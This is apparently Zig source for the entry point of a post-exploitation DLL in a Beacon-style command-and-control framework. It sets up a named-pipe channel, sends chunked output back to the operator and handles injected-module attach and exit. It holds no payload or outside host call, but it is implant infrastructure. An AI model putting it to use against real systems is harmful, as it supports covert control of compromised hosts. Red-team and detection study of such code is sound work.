const std = @import("std");
const postex_main = @import("postexmain.zig");
const win = std.os.windows;

extern "kernel32" fn PeekNamedPipe(win.HANDLE, ?win.LPVOID, win.DWORD, ?*win.DWORD, ?*win.DWORD, ?*win.DWORD) win.BOOL;
extern "user32" fn MessageBoxA(hWnd: ?win.HWND, lpText: win.LPCSTR, lpCaption: win.LPCSTR, uType: win.UINT) callconv(.winapi) win.INT;
extern "kernel32" fn CreateNamedPipeA(lpName: win.LPCSTR, dwOpenMode: win.DWORD, dwPipeMode: win.DWORD, nMaxInstance: win.DWORD, nOutBufferSize: win.DWORD, nInBufferSIze: win.DWORD, nDefaultTimeOut: win.DWORD, lpSecurityAttributes: ?win.LPVOID) callconv(.winapi) win.HANDLE;
extern "kernel32" fn ConnectNamedPipe(hNamedPipe: win.HANDLE, lpOverlapped: ?win.LPVOID) callconv(.winapi) win.BOOL;
extern "kernel32" fn DisconnectNamedPipe(hNamePipe: win.HANDLE) callconv(.winapi) win.BOOL;
extern "kernel32" fn ExitThread(dwExitCode: win.DWORD) void;

pub const CALLBACK_OUTPUT = 0x00;
pub const CALLBACK_OUTPUT_OEM = 0x1e;
pub const CALLBACK_OUTPUT_UTF8 = 0x20;
pub const CALLBACK_ERROR = 0x0d;
pub const CALLBACK_CUSTOM = 0x1000;
pub const CALLBACK_CUSTOM_LAST = 0x13ff;

const DLL_PROCESS_ATTACH = 1;
const DLL_THREAD_ATTACH = 2;
const DLL_THREAD_DETACH = 3;
const DLL_PROCESS_DETACH = 0;
const DLL_PROCESS_VERIFIER = 4;

const DLL_POSTEX_ATTACH = 0x4;
const EXITFUNC_PROCESS = 0x56A2B5F0;
const EXITFUNC_THREAD = 0x0A2A1DE0;

pub const MAX_PACKET_SIZE = 524288;

const PostexArguments = extern struct {
    exitFunc: win.DWORD,
    obfuscateKey: [4]u8,
    cleanupLoader: u8,
    maxPacketSize: u32,
    userArgumentBufferSize: u32,
};

const UserArgumentInfo = extern struct {
    buffer: [*]u8,
    size: u32,
};

pub const PostexData = extern struct {
    pPostexArguments: *volatile PostexArguments,
    userArgumentInfo: UserArgumentInfo,
    postexLoaderBaseAddress: *anyopaque,
    loadedDllBaseAddress: *anyopaque,
    startNamedPipe: u32,
};

const bufferSize = 1024 * 1024;
var gPostexData: PostexData = undefined;
pub var gPipeHandle: win.HANDLE = win.INVALID_HANDLE_VALUE;
var gPipeName = "\\\\.\\pipe\\POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE".*;
var gPostexArgumentsBuffer = "_POSTEX_ARGUMENTS___".*;

pub const Pipes = struct {
    fn startNamedPipeServer() bool {
        //_ = MessageBoxA(null, &gPipeName, "A", 0);
        gPipeHandle = CreateNamedPipeA(&gPipeName, win.PIPE_ACCESS_DUPLEX, win.PIPE_TYPE_MESSAGE | win.PIPE_READMODE_MESSAGE, 1, bufferSize, bufferSize, 0, null);
        if (gPipeHandle == win.INVALID_HANDLE_VALUE) return false;

        var timer: u32 = 0;
        var pipe_connection: win.BOOL = 0;
        while (pipe_connection == 0) {
            if (timer == 10) {
                if (DisconnectNamedPipe(gPipeHandle) == win.FALSE) return false;
                std.os.windows.CloseHandle(gPipeHandle);
                return false;
            }
            pipe_connection = ConnectNamedPipe(gPipeHandle, null);
            std.Thread.sleep(nanoToMili(1000));
            timer += 1;
        }

        //_ = MessageBoxA(null, "Connected", "B", 0);
        return true;
    }

    fn stopNamedPipeServer() void {
        if (win.kernel32.FlushFileBuffers(gPipeHandle) == win.FALSE) return;
        if (DisconnectNamedPipe(gPipeHandle) == win.FALSE) return;

        win.CloseHandle(gPipeHandle);
    }

    pub fn clientConnected(hPipe: win.HANDLE) bool {
        if (PeekNamedPipe(hPipe, null, 0, null, null, null) == win.FALSE) {
            return false;
        }
        return true;
    }

    fn getAvailableDataFromNamedPipe() win.DWORD {
        var bytes_available: win.DWORD = 0;
        _ = PeekNamedPipe(gPipeHandle, null, 0, null, &bytes_available, null);
        return bytes_available;
    }

    fn namedPipeRead(buffer: [*]u8, length: win.DWORD) win.BOOL {
        var total_read: usize = 0;
        while (total_read < length) {
            const read = win.ReadFile(gPipeHandle, buffer[total_read..length], length - total_read) catch return win.FALSE;
            total_read += read;
        }
        return win.TRUE;
    }
};

pub const Beacon = struct {
    fn beaconOutput(output_type: u32, data: []u8, length: u32, allocator: std.mem.Allocator) void {
        const chunk_size = gPostexData.pPostexArguments.maxPacketSize;
        const header_size = 3 * @sizeOf(win.DWORD);
        const max_payload_size: u32 = @as(u32, @intCast(chunk_size)) - header_size;
        const output_buffer_length = header_size + (if (max_payload_size < length) max_payload_size else length);

        var output = allocator.alloc(u8, output_buffer_length) catch |err| {
            beaconPrintf(CALLBACK_ERROR, "beaconOutput failure : {}", .{err});
            return;
        };
        defer allocator.free(output);

        var chunk_id: u16 = 0;
        var payload_bytes_written: usize = 0;

        const payload = data;
        while (payload_bytes_written < length) {
            const remaining_size = length - payload_bytes_written;
            const payload_length = if (remaining_size < max_payload_size) remaining_size else max_payload_size;

            var flags: u32 = undefined;
            if (remaining_size == payload_length) {
                flags = chunk_id | @as(u32, 1) << 16;
            } else {
                flags = chunk_id | 0 << 16;
            }
            std.mem.writeInt(win.DWORD, output[0..4], @as(u32, @sizeOf(win.DWORD)) + @as(u32, @intCast(payload_length)), .big);
            std.mem.writeInt(win.DWORD, output[4..8], @as(u32, @intCast(flags)), .big);
            std.mem.writeInt(win.DWORD, output[8..12], output_type, .big);

            @memcpy(output[header_size..output.len], payload[0..]);
            payload_bytes_written += win.WriteFile(gPipeHandle, output, null) catch return;

            chunk_id += 1;
        }
    }

    pub fn beaconPrintf(output_type: u32, comptime fmt: []const u8, args: anytype) void {
        // Cannot get smp_allocator to work at all so we're stuck with this.
        var dba = std.heap.DebugAllocator(.{ .safety = false, .backing_allocator_zeroes = false }){};
        const allocator = dba.allocator();
        const output = std.fmt.allocPrint(allocator, fmt, args) catch return;
        defer allocator.free(output);

        beaconOutput(output_type, output, @intCast(output.len), allocator);
    }
};

pub fn nanoToMili(x: comptime_int) comptime_int {
    return x * 1_000_000;
}

fn postexExit(postexData: *PostexData) void {
    if (@intFromPtr(postexData) == 0) return;

    if (postexData.startNamedPipe == win.TRUE) Pipes.stopNamedPipeServer();
    if (postexData.pPostexArguments.exitFunc == EXITFUNC_THREAD) {
        ExitThread(0);
    } else if (postexData.pPostexArguments.exitFunc == EXITFUNC_PROCESS) win.kernel32.ExitProcess(0);

    return;
}

pub fn dllEntryPoint(hModule: win.HMODULE, ul_reason_for_call: win.DWORD, lpReserved: ?win.LPVOID, startPipeServer: win.BOOL) win.BOOL {
    switch (ul_reason_for_call) {
        DLL_PROCESS_ATTACH => gPostexData.loadedDllBaseAddress = @ptrCast(hModule),
        DLL_POSTEX_ATTACH => {
            gPostexData.startNamedPipe = @as(u32, @intCast(startPipeServer));

            const args_ptr: *volatile PostexArguments = @ptrCast(@alignCast(&gPostexArgumentsBuffer));
            gPostexData.pPostexArguments = args_ptr;

            //var buf: [1024]u8 = undefined;
            //var fba = std.heap.FixedBufferAllocator.init(&buf);
            //const alloc = fba.allocator();
            //_ = std.fmt.allocPrint(alloc, "{} @ {}", .{ @as(*anyopaque, gPostexData.pPostexArguments), gPostexData.pPostexArguments }) catch {
            //    _ = MessageBoxA(null, "PRINT FAILED", "A", 0);
            //    return 1;
            //};

            //const str2 = std.fmt.allocPrint(alloc, "{*}:{*}:{x}:{x}", .{ gPostexData.pPostexArguments, @as(*u32, @ptrCast(@alignCast(gPostexData.pPostexArguments))), @as(*u32, @ptrCast(@alignCast(gPostexData.pPostexArguments))).*, gPostexData.pPostexArguments.exitFunc }) catch {
            //    _ = MessageBoxA(null, "PRINT FAILED", "A", 0);
            //    return 1;
            //};

            //_ = MessageBoxA(null, @ptrCast(str.ptr), "A", 0);
            //_ = MessageBoxA(null, @ptrCast(str2.ptr), "A", 0);

            gPostexData.userArgumentInfo.size = gPostexData.pPostexArguments.userArgumentBufferSize;

            if (gPostexData.pPostexArguments.userArgumentBufferSize > 0 and lpReserved != null) {
                gPostexData.userArgumentInfo.buffer = @ptrCast(lpReserved);
            } else {
                gPostexData.userArgumentInfo.buffer = undefined;
            }

            gPostexData.postexLoaderBaseAddress = @ptrCast(hModule);

            // Simple itegrity check
            if ((gPostexData.pPostexArguments.exitFunc != EXITFUNC_PROCESS and gPostexData.pPostexArguments.exitFunc != EXITFUNC_THREAD)) {
                //_ = MessageBoxA(null, "exitFunc not valid", "ERR", 0);
                return win.FALSE;
            }

            if (Pipes.startNamedPipeServer() == false) return win.FALSE;

            //postexMain(gPostexData);
            postex_main.postexMain(gPostexData);
            postexExit(&gPostexData);
        },
        else => {},
    }
    return win.TRUE;
}
